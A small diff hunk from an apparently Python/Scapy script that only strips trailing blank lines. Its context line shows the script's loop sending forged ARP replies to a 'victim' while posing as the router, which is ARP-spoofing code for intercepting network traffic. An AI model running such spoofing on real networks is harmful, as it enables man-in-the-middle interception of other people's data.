@@ -43,16 +43,4 @@ try:
         tovictim = srp((Ether(dst=mac[victim])/ARP(op = 2,pdst=ip[victim], psrc=routerip)), timeout=3, verbose=0)
         time.sleep(2)
 except KeyboardInterrupt:
-    pass
-
-    
-    
-
-
-
-
-    
-    
-
-    
-    
+    pass  
